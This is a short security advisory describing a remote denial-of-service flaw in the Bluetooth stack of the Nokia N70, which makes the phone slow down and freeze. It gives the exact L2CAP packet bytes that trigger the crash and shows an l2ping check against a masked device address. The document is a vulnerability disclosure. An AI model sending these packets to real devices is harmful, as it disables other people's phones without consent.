Subject: [ Secuobs - Advisory ] Another kind of DoS on
	Nokia cell phones


[Software affected] Bluetooth Stack on Nokia cell phones

[Version] Nokia N70 and maybe other models

[Impact] Remote Denial of Service, cellular phones begin to be slower and then freeze after a short period (within 30 seconds).

[Credits] Pierre Betouin - pierre.betouin@...ratech.fr -  Bug found with BSS new release v0.8 GPL fuzzer (Bluetooh Stack Smasher - Linux) 

BSS could be downloaded on  http://www.secuobs.com/news/15022006-bss_0_8.shtml

[Vendor] notified now

[Concept]

L2CAP packets responsible of the crash are :

7D AF 00 00 41 41 41

Where:

Code field 0x7D (1 byte)
Ident field 0xAF (1 byte)
Length field 0x0000 (2 bytes)

0x41 bytes are random padding.


[Proof of Concept]

# l2ping -c 3 00:15:A0:XX:XX:XX

Ping: 00:15:A0:XX:XX:XX from 00:20:E0:75:83:DA (data size 44) ...

0 bytes from 00:15:A0:XX:XX:XX id 0 time 64.18ms

0 bytes from 00:15:A0:XX:XX:XX id 1 time 43.94ms

0 bytes from 00:15:A0:XX:XX:XX id 2 time 37.25ms

3 sent, 3 received, 0% loss
